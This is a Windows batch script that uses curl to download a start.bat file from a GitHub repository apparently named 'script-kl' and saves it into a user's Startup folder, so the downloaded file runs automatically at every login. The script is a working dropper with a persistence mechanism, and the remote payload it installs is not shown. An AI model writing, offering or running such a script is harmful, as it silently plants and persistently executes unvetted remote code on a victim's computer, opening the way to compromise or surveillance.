@echo off
rem Set the URL of the raw file
set URL=https://raw.githubusercontent.com/kentcarloestillore/script-kl/main/start.bat
rem Set the output directory (Startup folder)
set OUTPUT_DIR=C:\Users\Braiel\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
rem Set the output file path
set OUTPUT=%OUTPUT_DIR%\start.bat

rem Check if curl is available
where curl >nul 2>nul
if %errorlevel% neq 0 (
    echo curl is not installed. Please install curl and try again.
    pause
    exit /b
)

rem Download the file using curl
curl -L -o "%OUTPUT%" "%URL%"

rem Check if the download was successful
if exist "%OUTPUT%" (
    echo Download successful: %OUTPUT%
) else (
    echo Download failed.
)
pause
